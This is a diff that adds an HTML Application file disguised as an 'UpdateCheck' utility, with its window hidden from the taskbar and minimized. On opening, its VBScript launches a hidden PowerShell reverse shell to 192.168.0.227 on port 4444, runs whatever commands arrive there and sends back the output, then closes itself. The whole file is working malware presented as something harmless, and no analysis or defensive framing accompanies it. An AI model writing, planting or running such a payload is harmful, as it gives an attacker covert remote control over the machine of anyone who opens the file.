@@ -1,0 +1,21 @@
+<html>
+<head>
+    <HTA:APPLICATION 
+        ID="stealth"
+        APPLICATIONNAME="UpdateCheck"
+        BORDER="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+        WINDOWSTATE="minimize"
+    >
+    <script language="VBScript">
+        On Error Resume Next
+        Set shell = CreateObject("WScript.Shell")
+        shell.Run "cmd /c powershell -w hidden -nop -c ""$c=New-Object System.Net.Sockets.TCPClient('192.168.0.227',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($r=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$r);$s.Write(([text.encoding]::ASCII).GetBytes((iex $d 2>&1)),0,$d.Length)}""", 0, False
+        self.close
+    </script>
+</head>
+<body></body>
+</html>
